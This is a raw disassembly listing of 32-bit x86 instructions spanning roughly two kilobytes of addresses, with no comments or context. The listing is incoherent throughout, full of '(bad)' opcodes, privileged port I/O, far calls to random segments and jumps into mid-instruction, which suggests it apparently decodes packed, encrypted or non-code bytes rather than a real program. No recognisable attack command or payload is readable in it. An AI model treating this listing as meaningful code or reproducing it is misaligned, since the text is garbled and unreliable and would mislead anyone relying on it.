  40d5e2:	xchg   DWORD PTR [esi-0xb5f16b],ebp
  40d5e8:	loop   0x40d625
  40d5ea:	xor    al,0x26
  40d5ec:	scas   al,BYTE PTR es:[edi]
  40d5ed:	sbb    cl,BYTE PTR [esi]
  40d5ef:	loope  0x40d61e
  40d5f1:	push   cs
  40d5f2:	lock xor cl,BYTE PTR [ebx]
  40d5f5:	fldenv [edx-0x7fe23776]
  40d5fb:	dec    esp
  40d5fc:	retf   
  40d5fd:	setne  BYTE PTR [esi-0x67]
  40d601:	fmul   QWORD PTR [ebx]
  40d603:	xchg   ecx,eax
  40d604:	sbb    al,0xf0
  40d606:	pop    ecx
  40d607:	push   edx
  40d608:	mov    ds:0xc88b4a30,al
  40d60d:	push   esi
  40d60e:	mov    ebx,ecx
  40d610:	mov    al,0xdd
  40d612:	ret    
  40d613:	in     eax,dx
  40d614:	(bad)  
  40d615:	(bad)  
  40d616:	mov    ecx,0x4eb1e559
  40d61b:	frstor fs:[esi+0x7733beee]
  40d622:	mov    ds:0xf28fb782,al
  40d627:	dec    ebp
  40d628:	cmp    al,0xa2
  40d62a:	(bad)  
  40d62b:	ins    BYTE PTR es:[edi],dx
  40d62c:	sbb    al,0x6d
  40d62e:	dec    eax
  40d62f:	add    DWORD PTR [esp+edx*4-0x16],0xc3d96ece
  40d637:	into   
  40d638:	xor    al,0x82
  40d63a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d63b:	ret    
  40d63c:	cmp    DWORD PTR [eax-0x27],esi
  40d63f:	mov    eax,0xba3680df
  40d644:	repz je 0x40d693
  40d647:	popa   
  40d648:	xchg   esi,eax
  40d649:	and    bh,bh
  40d64b:	jp     0x40d645
  40d64d:	leave  
  40d64e:	mov    ch,0x76
  40d650:	(bad)  
  40d651:	fld    QWORD PTR [ebx+0x49]
  40d654:	sbb    ch,ah
  40d656:	cwde   
  40d657:	addr16 iret 
  40d659:	pop    esp
  40d65a:	xchg   ebx,eax
  40d65b:	mov    edx,0xa4eccc2a
  40d660:	inc    ebp
  40d661:	push   edi
  40d662:	sahf   
  40d663:	test   BYTE PTR [esi],bl
  40d665:	fwait
  40d666:	and    al,0x83
  40d668:	loop   0x40d659
  40d66a:	xchg   esp,eax
  40d66b:	aaa    
  40d66c:	test   eax,0x2dc809b5
  40d671:	inc    ecx
  40d672:	fs test eax,0xd30e7988
  40d678:	mov    DWORD PTR [esi],ebx
  40d67a:	test   al,0x81
  40d67c:	mov    edi,DWORD PTR [edx-0x58]
  40d67f:	adc    edx,esp
  40d681:	dec    eax
  40d682:	nop
  40d683:	pop    esi
  40d684:	dec    ebp
  40d685:	mov    ch,0x6a
  40d687:	test   eax,0x1526352e
  40d68c:	addr16 (bad) 
  40d68e:	in     eax,0x82
  40d690:	xbegin 0xf423f587
  40d696:	gs scas al,BYTE PTR es:[edi]
  40d698:	aaa    
  40d699:	jl     0x40d6b6
  40d69b:	or     DWORD PTR [esi+0x67],ebx
  40d69e:	jbe    0x40d6d0
  40d6a0:	xchg   ecx,eax
  40d6a1:	pop    eax
  40d6a2:	(bad)  
  40d6a3:	outs   dx,DWORD PTR ds:[esi]
  40d6a4:	in     al,dx
  40d6a5:	stc    
  40d6a6:	inc    esp
  40d6a7:	mov    eax,ds:0xb840fe26
  40d6ac:	or     esi,esp
  40d6ae:	dec    ebp
  40d6af:	inc    ebx
  40d6b0:	fs cli 
  40d6b2:	cmp    dh,BYTE PTR [esi+0x55]
  40d6b5:	and    BYTE PTR [eax-0x72],cl
  40d6b8:	pop    ss
  40d6b9:	mov    al,0x9c
  40d6bb:	xlat   BYTE PTR ds:[ebx]
  40d6bc:	xor    al,0xf9
  40d6be:	call   0xe10e6fb7
  40d6c3:	jne    0x40d6df
  40d6c5:	out    dx,eax
  40d6c6:	adc    BYTE PTR [edx+0x74],bh
  40d6c9:	ds sbb al,0x85
  40d6cc:	push   esp
  40d6cd:	push   ebx
  40d6ce:	pop    ecx
  40d6cf:	or     cl,BYTE PTR [ebx+0x2b]
  40d6d2:	and    bl,BYTE PTR [edx+0x28094482]
  40d6d8:	outs   dx,BYTE PTR ds:[esi]
  40d6d9:	push   eax
  40d6da:	and    edx,DWORD PTR [edi-0x134a2daf]
  40d6e0:	and    al,0x63
  40d6e2:	std    
  40d6e3:	pushf  
  40d6e4:	mov    ebx,0xbe65cb36
  40d6e9:	fwait
  40d6ea:	in     al,0xa1
  40d6ec:	sub    ch,BYTE PTR [ebx+0x1a329f9b]
  40d6f2:	call   0x8237:0x89d49bd8
  40d6f9:	dec    esi
  40d6fa:	fdivr  st,st(7)
  40d6fc:	fst    QWORD PTR [ebp-0x4b]
  40d6ff:	jne    0x40d72a
  40d701:	pop    ebp
  40d702:	and    DWORD PTR [ebx+0x167974c1],edx
  40d708:	or     BYTE PTR [edi],bh
  40d70a:	(bad)  
  40d70b:	cmp    dl,dl
  40d70d:	fisub  WORD PTR [edi+0x66cb0d01]
  40d713:	jnp    0x40d6ac
  40d715:	xor    edx,esi
  40d717:	(bad)  
  40d718:	push   0xa58151b7
  40d71d:	dec    edi
  40d71e:	mov    ds:0x5704fb2b,al
  40d723:	jb     0x40d78d
  40d725:	mov    ch,0xb0
  40d727:	ins    DWORD PTR es:[edi],dx
  40d728:	in     al,dx
  40d729:	daa    
  40d72a:	mov    ds:0x2f0cf513,eax
  40d72f:	mov    bh,0x7
  40d731:	test   eax,0x39da5a7a
  40d736:	aad    0x44
  40d738:	and    DWORD PTR gs:[ecx+eax*2],eax
  40d73c:	outs   dx,DWORD PTR ds:[esi]
  40d73d:	inc    esp
  40d73e:	out    0x4d,eax
  40d740:	popf   
  40d741:	(bad)  
  40d742:	in     al,dx
  40d743:	out    dx,al
  40d744:	js     0x40d6c7
  40d746:	push   ds
  40d747:	pop    eax
  40d748:	or     bh,BYTE PTR [eax+esi*4+0x57632c41]
  40d74f:	sub    esp,ecx
  40d751:	fimul  DWORD PTR [esp+esi*1-0x1507781c]
  40d758:	fs popf 
  40d75a:	sub    eax,0x3387a441
  40d75f:	pxor   mm6,QWORD PTR [edx-0x73]
  40d763:	jecxz  0x40d772
  40d765:	imul   BYTE PTR [ecx]
  40d767:	mov    ecx,0xe022e9b4
  40d76c:	ja     0x40d7ec
  40d76e:	push   0x907e355f
  40d773:	sub    eax,DWORD PTR [edx+eax*4-0x7c3ec5b2]
  40d77a:	sbb    eax,0x730eb1b6
  40d77f:	jmp    0xbed3f4f0
  40d784:	jo     0x40d7b1
  40d786:	repnz mov esi,0x94c1f596
  40d78c:	repnz stos BYTE PTR es:[edi],al
  40d78e:	mov    ah,0x62
  40d790:	cld    
  40d791:	jmp    0x5ce2:0x4efa5f76
  40d798:	sbb    eax,0x65f5150b
  40d79d:	push   eax
  40d79e:	pop    eax
  40d79f:	sub    ebp,0x9dba504
  40d7a5:	cld    
  40d7a6:	sbb    ebp,edi
  40d7a8:	sub    DWORD PTR [ebx],ebx
  40d7aa:	fisttp WORD PTR [eax-0x42]
  40d7ad:	rcl    BYTE PTR ds:0x78b8fabd,cl
  40d7b3:	out    dx,al
  40d7b4:	call   0x1ec8244b
  40d7b9:	pop    es
  40d7ba:	es nop
  40d7bc:	(bad)  
  40d7be:	les    esp,FWORD PTR [ebp-0x49]
  40d7c1:	xchg   ecx,eax
  40d7c2:	(bad)  
  40d7c3:	mov    esp,0x721730f2
  40d7c8:	pop    esp
  40d7c9:	xchg   eax,eax
  40d7cb:	js     0x40d783
  40d7cd:	xchg   edx,eax
  40d7ce:	mul    DWORD PTR [ecx-0x38]
  40d7d1:	fwait
  40d7d2:	jp     0x40d828
  40d7d4:	imul   esp,DWORD PTR [esi-0x63980e80],0xffffffee
  40d7db:	or     eax,0x5e298777
  40d7e0:	sar    BYTE PTR [edi],cl
  40d7e2:	xchg   esi,eax
  40d7e3:	std    
  40d7e4:	lock aad 0x0
  40d7e7:	xor    edi,esp
  40d7e9:	pop    edi
  40d7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7eb:	mov    ds:0xbd71d57a,al
  40d7f0:	js     0x40d7fa
  40d7f2:	outs   dx,BYTE PTR ds:[esi]
  40d7f3:	pop    ebp
  40d7f4:	dec    ebp
  40d7f5:	jns    0x40d7e4
  40d7f7:	retf   0x1aae
  40d7fa:	xor    al,0x20
  40d7fc:	pushf  
  40d7fd:	mov    edx,0xc6a2ce67
  40d802:	add    ebx,DWORD PTR [eax]
  40d804:	shl    BYTE PTR [esi-0x55],0x3d
  40d808:	dec    ecx
  40d809:	xchg   ecx,eax
  40d80a:	fwait
  40d80b:	ret    
  40d80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d80d:	push   ss
  40d80e:	imul   edi,DWORD PTR [esi-0x50666151],0xffffffcf
  40d815:	popf   
  40d816:	xor    al,0x8
  40d818:	addr16 sahf 
  40d81a:	pop    ds
  40d81b:	adc    eax,0x23402db4
  40d820:	pop    eax
  40d821:	or     DWORD PTR [edx+0x7f200aae],edx
  40d827:	scas   al,BYTE PTR es:[edi]
  40d828:	sar    DWORD PTR [ebp+0x7e],0xec
  40d82c:	xchg   edx,eax
  40d82d:	ss xchg edi,eax
  40d82f:	mov    BYTE PTR [esi+ebp*8],cl
  40d832:	in     al,dx
  40d833:	rcl    DWORD PTR [ecx],0x44
  40d836:	xor    BYTE PTR [edx],0x6b
  40d839:	inc    ebx
  40d83a:	push   esi
  40d83b:	jecxz  0x40d7e0
  40d83d:	sub    bl,dl
  40d83f:	add    eax,0x2f92bf26
  40d844:	push   eax
  40d845:	sbb    DWORD PTR [edx],eax
  40d847:	stc    
  40d848:	pop    ecx
  40d849:	loop   0x40d85b
  40d84b:	imul   eax
  40d84d:	jae    0x40d7e3
  40d84f:	fdivr  DWORD PTR [eax]
  40d851:	jg     0x40d7d6
  40d853:	pmulhuw mm6,mm4
  40d856:	jmp    0x40d816
  40d858:	cmp    eax,0x29073584
  40d85d:	or     BYTE PTR [ecx-0x34],ah
  40d860:	cmp    cl,ch
  40d862:	xor    al,0x40
  40d864:	cmp    edx,edi
  40d866:	loopne 0x40d8be
  40d868:	adc    eax,0x9f5375cf
  40d86d:	dec    ebp
  40d86e:	sti    
  40d86f:	adc    BYTE PTR [eax-0x20],dh
  40d872:	nop
  40d873:	in     eax,0x55
  40d875:	js     0x40d836
  40d877:	mov    edx,0xa7e30f58
  40d87c:	rcr    DWORD PTR cs:[edi+ebx*4],1
  40d880:	je     0x40d8a2
  40d882:	push   ebp
  40d883:	xchg   ecx,eax
  40d884:	mov    esi,0x90e1f156
  40d889:	mov    ecx,0xc1ffdb74
  40d88e:	bound  edi,QWORD PTR [eax+0x10]
  40d891:	test   BYTE PTR [edi-0x5b76eed9],cl
  40d897:	adc    al,0x7f
  40d899:	dec    esp
  40d89a:	xor    al,0x78
  40d89c:	cwde   
  40d89d:	loop   0x40d8f1
  40d89f:	mov    bl,0x91
  40d8a1:	mov    eax,ds:0x22317004
  40d8a6:	push   ecx
  40d8a7:	xchg   edx,eax
  40d8a8:	mov    DWORD PTR [edi-0x68],0xbd973715
  40d8af:	(bad)  
  40d8b0:	fiadd  DWORD PTR [ecx-0x3d]
  40d8b3:	call   0xbdce2128
  40d8b8:	ret    
  40d8b9:	add    cl,bl
  40d8bb:	and    cl,0xd2
  40d8be:	xor    eax,0xca0a6594
  40d8c3:	mov    bl,0x37
  40d8c5:	jbe    0x40d8bc
  40d8c7:	in     eax,0xb9
  40d8c9:	mul    BYTE PTR [edi-0x33078f6d]
  40d8cf:	and    BYTE PTR [edx-0x71],cl
  40d8d2:	loope  0x40d887
  40d8d4:	mov    ebp,0xdbabecfa
  40d8d9:	mov    ds:0x601ee0cc,al
  40d8de:	fsub   QWORD PTR [ebp+0xf2aaa5c]
  40d8e4:	cs adc al,0x45
  40d8e7:	in     eax,dx
  40d8e8:	mov    esp,eax
  40d8ea:	xchg   ebx,eax
  40d8eb:	jnp    0x40d893
  40d8ed:	pop    ecx
  40d8ee:	pop    ebx
  40d8ef:	rol    BYTE PTR [edi-0xd],1
  40d8f2:	inc    esp
  40d8f3:	into   
  40d8f4:	daa    
  40d8f5:	inc    esi
  40d8f6:	ss in  al,dx
  40d8f8:	adc    DWORD PTR [edx-0x39916ff1],eax
  40d8fe:	adc    eax,0xdbd7932e
  40d903:	icebp  
  40d904:	mov    ebp,0x9f4b0459
  40d909:	scas   eax,DWORD PTR es:[edi]
  40d90a:	loop   0x40d96e
  40d90c:	mov    esp,0x18cbd5ed
  40d911:	in     al,0x30
  40d913:	dec    edi
  40d914:	adc    DWORD PTR [ebp+0x71],0x4242fca1
  40d91b:	jp     0x40d8bf
  40d91d:	mov    edx,0xeb1339ba
  40d922:	shl    BYTE PTR [ebx+eiz*4],1
  40d925:	mov    WORD PTR [ecx-0x13],es
  40d928:	or     bh,BYTE PTR [eax+0x75b5b1ae]
  40d92e:	ja     0x40d92e
  40d930:	jns    0x40d8fe
  40d932:	pop    ss
  40d933:	pop    ss
  40d934:	bswap  ebp
  40d936:	les    ebp,FWORD PTR [esi-0xa]
  40d939:	test   eax,0xeb8e6dd4
  40d93e:	xchg   ebx,edi
  40d940:	xchg   esp,esi
  40d942:	mov    ebp,0x3e81095f
  40d947:	mov    edi,0xf163639c
  40d94c:	test   al,0x9d
  40d94e:	pop    eax
  40d94f:	pop    esi
  40d950:	je     0x40d92a
  40d952:	pop    ebp
  40d953:	mov    edi,0x9979e8c0
  40d958:	lods   eax,DWORD PTR ds:[esi]
  40d959:	sti    
  40d95a:	lods   al,BYTE PTR ds:[esi]
  40d95b:	mov    WORD PTR [esi+0x30],?
  40d95e:	sahf   
  40d95f:	cmp    DWORD PTR [eax-0x7b7a7664],edi
  40d965:	gs cmp al,0x8a
  40d968:	in     eax,dx
  40d969:	dec    esp
  40d96a:	sti    
  40d96b:	xchg   edi,eax
  40d96c:	fwait
  40d96d:	rcl    DWORD PTR [edi+ecx*2-0x76],cl
  40d971:	push   edi
  40d972:	iret   
  40d973:	mov    BYTE PTR [eax+0x5f],ch
  40d976:	jge    0x40d9a4
  40d978:	(bad)  
  40d979:	mov    dh,0xe1
  40d97b:	lea    edx,ds:0xb8e31ef3
  40d981:	or     ebp,DWORD PTR [esi-0x6bce7a90]
  40d987:	scas   al,BYTE PTR es:[edi]
  40d988:	or     al,0xe2
  40d98a:	sar    edi,1
  40d98c:	add    BYTE PTR [esi-0xc],dl
  40d98f:	add    dh,BYTE PTR [esi+0x7]
  40d992:	pop    DWORD PTR [edx-0x4e]
  40d995:	xchg   esi,eax
  40d996:	mov    ebp,0x83575ff
  40d99b:	mov    esi,0x845a2e34
  40d9a0:	dec    esi
  40d9a1:	dec    ebp
  40d9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a3:	mov    eax,0x87035659
  40d9a8:	aam    0x2f
  40d9aa:	popf   
  40d9ab:	mul    BYTE PTR [edx+edi*2+0x77]
  40d9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9b1:	dec    edi
  40d9b2:	das    
  40d9b3:	repz aad 0x1a
  40d9b6:	mov    bl,0x7d
  40d9b8:	mov    eax,0xcfc02de4
  40d9bd:	pusha  
  40d9be:	pop    ss
  40d9bf:	(bad)  
  40d9c0:	hlt    
  40d9c1:	mov    ch,0x50
  40d9c3:	dec    eax
  40d9c4:	push   esp
  40d9c5:	lea    esi,[ebx-0x28aafce0]
  40d9cb:	add    dh,BYTE PTR fs:[esi+0x11]
  40d9cf:	mov    esi,0xa55eedd7
  40d9d4:	mov    edi,DWORD PTR [edx+0x1cc09f1f]
  40d9da:	xor    ah,BYTE PTR [edi+0x34]
  40d9dd:	push   ebx
  40d9de:	sbb    BYTE PTR [edi],al
  40d9e0:	mov    ecx,0x9a9fc8f9
  40d9e5:	int3   
  40d9e6:	jno    0x40da58
  40d9e8:	jp     0x40d9c6
  40d9ea:	(bad)  
  40d9eb:	les    ebx,FWORD PTR [edx]
  40d9ed:	sbb    eax,0x4d7e3eb6
  40d9f2:	jmp    0x40da2a
  40d9f4:	in     al,dx
  40d9f5:	add    al,dh
  40d9f7:	xor    al,0x52
  40d9f9:	aad    0x12
  40d9fb:	repz (bad) 
  40d9fd:	mov    edx,0xb9c448e0
  40da02:	call   0x3e61:0x672244f9
  40da09:	mov    eax,ds:0xe2a410a4
  40da0e:	pop    ecx
  40da0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da10:	dec    ecx
  40da11:	cmp    ebp,DWORD PTR [edx-0x61]
  40da14:	jne    0x40d9e5
  40da16:	dec    ecx
  40da17:	dec    esp
  40da18:	aad    0x36
  40da1a:	in     eax,dx
  40da1b:	dec    edx
  40da1c:	sbb    al,0xb8
  40da1e:	stos   BYTE PTR es:[edi],al
  40da1f:	fldcw  WORD PTR [eax-0x64]
  40da22:	xchg   BYTE PTR [ecx],bh
  40da24:	cli    
  40da25:	mov    dl,0x8f
  40da27:	mov    fs,WORD PTR [ecx+0x5cf0e455]
  40da2d:	xchg   esp,eax
  40da2e:	call   ebx
  40da30:	mov    edi,0x8861b1ad
  40da35:	adc    al,BYTE PTR ds:0xc089e124
  40da3b:	push   es
  40da3c:	lds    eax,FWORD PTR [edx+0x2f]
  40da3f:	add    eax,0xeaa78fd5
  40da44:	mov    ds:0x8c552dc5,al
  40da49:	jno    0x40dab3
  40da4b:	pop    eax
  40da4c:	mov    eax,0xb92f6e7
  40da51:	sbb    eax,0x8ab56fe
  40da56:	sti    
  40da57:	scas   eax,DWORD PTR es:[edi]
  40da58:	pop    ss
  40da59:	rol    BYTE PTR [edx+0x26594f4c],cl
  40da5f:	popa   
  40da60:	retf   
  40da61:	aad    0x5a
  40da63:	inc    ebp
  40da64:	(bad)  
  40da65:	sub    al,0xaa
  40da67:	push   esi
  40da68:	icebp  
  40da69:	jbe    0x40dad7
  40da6b:	aad    0x7f
  40da6d:	mov    eax,0x7e53f07b
  40da72:	rcr    DWORD PTR ds:0x42fe423c,0x9c
  40da79:	scas   al,BYTE PTR es:[edi]
  40da7a:	pop    ebp
  40da7b:	and    eax,0x114c4e5f
  40da80:	pusha  
  40da81:	mov    ds:0xe9256914,eax
  40da86:	es in  eax,0x51
  40da89:	ret    0x2f70
  40da8c:	push   0x0
  40da8e:	xchg   edi,eax
  40da8f:	xor    edx,DWORD PTR [esi]
  40da91:	or     cl,BYTE PTR ds:0x2a983330
  40da97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da98:	add    eax,DWORD PTR [edx]
  40da9a:	dec    edx
  40da9b:	popf   
  40da9c:	push   ebx
  40da9d:	fisub  DWORD PTR [esi]
  40da9f:	inc    edx
  40daa0:	mov    ah,0xa8
  40daa2:	inc    esi
  40daa3:	cli    
  40daa4:	fistp  WORD PTR [ebp-0x697392c7]
  40daaa:	cli    
  40daab:	or     ah,BYTE PTR [eax+0x3f]
  40daae:	push   ds
  40daaf:	popf   
  40dab0:	jmp    0x40dac1
  40dab2:	ret    
  40dab3:	push   esi
  40dab4:	or     cl,BYTE PTR ds:0x86d3adf4
  40daba:	lahf   
  40dabb:	xor    esi,edi
  40dabd:	pop    ss
  40dabe:	add    esp,DWORD PTR gs:[ebx+0x1e5e08fa]
  40dac5:	pop    ebx
  40dac6:	push   ds
  40dac7:	xchg   edx,eax
  40dac8:	adc    ch,BYTE PTR [edx-0xe]
  40dacb:	pop    ebp
  40dacc:	mov    ebp,0xe1d84862
  40dad1:	stos   BYTE PTR es:[edi],al
  40dad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad3:	aam    0x48
  40dad5:	mov    ch,0x11
  40dad7:	inc    esi
  40dad8:	xchg   ebp,eax
  40dad9:	pop    es
  40dada:	stc    
  40dadb:	jne    0x40dadf
  40dadd:	cmp    al,0x38
  40dadf:	inc    edi
  40dae0:	std    
  40dae1:	iret   
  40dae2:	retf   0xa013
  40dae5:	in     al,0x73
  40dae7:	fnstenv [ebp+0x4579e4df]
  40daed:	xchg   ebp,eax
  40daee:	iret   
  40daef:	add    edx,DWORD PTR [eax]
  40daf1:	and    ch,bl
  40daf3:	mov    ecx,0x6a4d2bf5
  40daf8:	retf   
  40daf9:	cmp    ecx,ebp
  40dafb:	cmc    
  40dafc:	jbe    0x40dac6
  40dafe:	dec    edi
  40daff:	add    eax,0xbe96ff11
  40db04:	jge    0x40db6b
  40db06:	fsub   QWORD PTR [ecx+edi*8-0x790289a5]
  40db0d:	test   edi,ebp
  40db0f:	xchg   edx,eax
  40db10:	mov    dh,0xc2
  40db12:	test   esi,edi
  40db14:	and    DWORD PTR [ebx+ebx*4-0x89c2c3b],ebx
  40db1b:	je     0x40db85
  40db1d:	ds xchg ecx,eax
  40db1f:	sub    dl,BYTE PTR [esi-0x4bf9c80]
  40db25:	(bad)  
  40db27:	(bad)  
  40db29:	jns    0x40db91
  40db2b:	fisttp DWORD PTR ds:0xc4f185aa
  40db31:	adc    eax,DWORD PTR [edi+0xf]
  40db34:	lods   eax,DWORD PTR ds:[esi]
  40db35:	div    dl
  40db37:	sahf   
  40db38:	shl    edi,1
  40db3a:	test   eax,0x3b7dc769
  40db3f:	out    0xa2,al
  40db41:	mov    ds:0xadfd8a52,al
  40db46:	scas   eax,DWORD PTR es:[edi]
  40db47:	inc    edx
  40db48:	mov    al,ds:0xf40ce072
  40db4d:	xor    eax,ecx
  40db4f:	sbb    eax,DWORD PTR [ecx+0x42]
  40db52:	inc    ecx
  40db53:	ds dec ecx
  40db55:	mov    bh,0xf
  40db57:	in     eax,dx
  40db58:	mov    ebx,0x424d025
  40db5d:	repz inc ebp
  40db5f:	xlat   BYTE PTR ds:[ebx]
  40db60:	dec    edx
  40db61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db62:	xchg   esp,eax
  40db63:	xchg   edi,eax
  40db64:	cmp    bh,BYTE PTR [eax]
  40db66:	pandn  mm1,QWORD PTR [edi+0x212e66bb]
  40db6d:	and    DWORD PTR [ecx],ebp
  40db6f:	mov    bh,BYTE PTR [eax-0x66179316]
  40db75:	in     eax,dx
  40db76:	retf   0xdbd2
  40db79:	fst    DWORD PTR [esi]
  40db7b:	bound  ecx,QWORD PTR [ebp+0x5b8d4038]
  40db81:	push   edx
  40db82:	in     al,dx
  40db83:	icebp  
  40db84:	into   
  40db85:	pop    edi
  40db86:	lods   al,BYTE PTR ds:[esi]
  40db87:	mov    esp,0x185813eb
  40db8c:	fidiv  WORD PTR [edx]
  40db8e:	cmp    eax,DWORD PTR [edi+eiz*2]
  40db91:	mov    esp,0xe21b9a37
  40db96:	ss mov ah,0xbc
  40db99:	xchg   ebx,eax
  40db9a:	cmp    BYTE PTR ds:0x4a123917,dh
  40dba0:	push   esp
  40dba1:	cwde   
  40dba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dba3:	dec    edx
  40dba4:	dec    ebp
  40dba5:	dec    esi
  40dba6:	dec    ecx
  40dba7:	aaa    
  40dba8:	fisubr DWORD PTR [esi-0x23]
  40dbab:	test   DWORD PTR [ebx+0x52],edx
  40dbae:	add    ah,dl
  40dbb0:	sahf   
  40dbb1:	dec    edx
  40dbb2:	pushf  
  40dbb3:	inc    eax
  40dbb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbb5:	mov    ax,0x2cc2
  40dbb9:	xchg   bh,ch
  40dbbb:	or     eax,0x6c22b437
  40dbc0:	ret    0x433
  40dbc3:	inc    esp
  40dbc4:	pop    esi
  40dbc5:	imul   ebp,DWORD PTR [edi],0x1a
  40dbc8:	or     ch,0x2c
  40dbcb:	out    0x82,eax
  40dbcd:	jbe    0x40dbe1
  40dbcf:	ds xchg edi,eax
  40dbd1:	xchg   DWORD PTR ds:0x44f642bb,eax
  40dbd7:	stc    
  40dbd8:	jne    0x40dc1d
  40dbda:	push   esp
  40dbdb:	or     dl,bl
  40dbdd:	and    dh,BYTE PTR [esp+eax*4-0x4b4ab989]
  40dbe4:	push   ebp
  40dbe5:	leave  
  40dbe6:	loop   0x40dbaa
  40dbe8:	xchg   ecx,eax
  40dbe9:	sbb    DWORD PTR [edx-0x3a],edi
  40dbec:	nop
  40dbed:	sbb    al,BYTE PTR [edx+0x46]
  40dbf0:	add    DWORD PTR [edi-0x2f06eda4],0xffffffad
  40dbf7:	xor    eax,0x8defbb83
  40dbfc:	mov    ds:0x7615146d,al
  40dc01:	out    0xe8,al
  40dc03:	add    al,0x36
  40dc05:	out    dx,al
  40dc06:	cmp    bl,ch
  40dc08:	addr16 fndisi(8087 only) 
  40dc0b:	(bad)  
  40dc0d:	fcom   DWORD PTR [edx-0x2d]
  40dc10:	sub    al,0x23
  40dc12:	pop    ss
  40dc13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc14:	int3   
  40dc15:	jl     0x40dbbf
  40dc17:	pop    ebp
  40dc18:	(bad)  
  40dc19:	and    bh,BYTE PTR [ebp-0x7b12ce9f]
  40dc1f:	cmp    al,0xe9
  40dc21:	aad    0x18
  40dc23:	hlt    
  40dc24:	add    ebp,ecx
  40dc26:	out    dx,eax
  40dc27:	push   ebp
  40dc28:	retf   
  40dc29:	out    dx,eax
  40dc2a:	sar    BYTE PTR [ebp+0x2588103b],1
  40dc30:	pop    ss
  40dc31:	jns    0x40dc48
  40dc33:	neg    BYTE PTR [edx+0x601330ec]
  40dc39:	push   0x425e6018
  40dc3e:	pop    ebx
  40dc3f:	push   es
  40dc40:	jg     0x40dc0e
  40dc42:	out    0xb2,eax
  40dc44:	dec    esp
  40dc45:	cwde   
  40dc46:	adc    eax,0x9919a7b2
  40dc4b:	push   esi
  40dc4c:	jno    0x40dc71
  40dc4e:	int3   
  40dc4f:	pop    esp
  40dc50:	xchg   ebx,eax
  40dc51:	or     al,0xf3
  40dc53:	clc    
  40dc54:	gs js  0x40dc53
  40dc57:	jp     0x40dcd0
  40dc59:	cmp    al,0xc
  40dc5b:	imul   ecx,DWORD PTR [esp+eax*2],0xffffffe6
  40dc5f:	(bad)  
  40dc60:	scas   al,BYTE PTR es:[edi]
  40dc61:	lahf   
  40dc62:	xor    ecx,esi
  40dc64:	pop    ss
  40dc65:	ror    DWORD PTR [esi+edx*2],cl
  40dc68:	out    0x76,eax
  40dc6a:	pop    ds
  40dc6b:	inc    esp
  40dc6c:	rcr    dh,cl
  40dc6e:	push   ebp
  40dc6f:	mov    ah,0x9f
  40dc71:	push   cs
  40dc72:	loopne 0x40dc07
  40dc74:	cdq    
  40dc75:	push   cs
  40dc76:	ins    DWORD PTR es:[edi],dx
  40dc77:	sbb    BYTE PTR [ebx-0x23209d83],bl
  40dc7d:	jecxz  0x40dc79
  40dc7f:	shl    edx,1
  40dc81:	or     eax,0xbd74821a
  40dc86:	pop    esp
  40dc87:	repnz ins BYTE PTR es:[edi],dx
  40dc89:	mov    ds:0x5c9f5f01,eax
  40dc8e:	(bad)  
  40dc91:	popa   
  40dc92:	inc    edx
  40dc93:	and    al,ah
  40dc95:	int3   
  40dc96:	add    dh,BYTE PTR [ebx]
  40dc98:	inc    esi
  40dc99:	lahf   
  40dc9a:	mov    ebx,edi
  40dc9c:	dec    edx
  40dc9d:	enter  0xc30d,0x8
  40dca1:	mov    WORD PTR [eax],es
  40dca3:	adc    ah,0x15
  40dca6:	cmp    eax,esi
  40dca8:	sub    BYTE PTR [ebx-0x11],bh
  40dcab:	mov    ds:0x2baecfc6,eax
  40dcb0:	stos   DWORD PTR es:[edi],eax
  40dcb1:	ss inc esi
  40dcb3:	imul   BYTE PTR [edi+0x71]
  40dcb6:	enter  0x43f9,0x8d
  40dcba:	jae    0x40dcef
  40dcbc:	push   edi
  40dcbd:	nop
  40dcbe:	aaa    
  40dcbf:	xchg   ebx,eax
  40dcc0:	inc    ecx
  40dcc1:	jp     0x40dca4
  40dcc3:	pop    ecx
  40dcc4:	xchg   esi,ebp
  40dcc6:	sub    edx,DWORD PTR [edx+0x4cd52618]
  40dccc:	cwde   
  40dccd:	jg     0x40dd42
  40dccf:	push   0x873321fa
  40dcd4:	xchg   ecx,eax
  40dcd5:	jl     0x40dcb5
  40dcd7:	inc    esi
  40dcd8:	mov    al,0x2a
  40dcda:	dec    ebp
  40dcdb:	pop    ecx
  40dcdc:	call   0xc6f1:0x6f835a94
  40dce3:	sbb    eax,0x10c39652
  40dce8:	sti    
  40dce9:	adc    al,0x6c
  40dceb:	out    0x6d,eax
  40dced:	dec    esi
  40dcee:	sahf   
  40dcef:	es mov ecx,0x8df199b1
  40dcf5:	fbld   TBYTE PTR [ebp-0x51]
  40dcf8:	in     al,0x12
  40dcfa:	fisub  DWORD PTR [edi]
  40dcfc:	xchg   ebp,eax
  40dcfd:	add    bh,BYTE PTR [edx-0x2433ba53]
  40dd03:	ja     0x40dccf
  40dd05:	pop    esp
  40dd06:	dec    eax
  40dd07:	(bad)  
  40dd08:	retf   0xe1db
  40dd0b:	out    0xce,eax
  40dd0d:	popf   
  40dd0e:	push   0xffffffd6
  40dd10:	jmp    0x40dcd0
  40dd12:	push   ds
  40dd13:	xchg   BYTE PTR [edi],al
  40dd15:	retf   0x990f
  40dd18:	out    dx,eax
  40dd19:	or     esi,edx
  40dd1b:	sub    al,0xed
  40dd1d:	dec    edi
  40dd1e:	aaa    
  40dd1f:	jge    0x40dd9c
  40dd21:	fnstsw WORD PTR [ebp-0x5e12b65b]
  40dd27:	jbe    0x40dcd8
  40dd29:	ret    0xebab
  40dd2c:	pop    es
  40dd2d:	xchg   DWORD PTR [ebp-0xd8e982c],ebx
  40dd33:	jo     0x40dd5a
  40dd35:	mov    ebx,0x5105b616
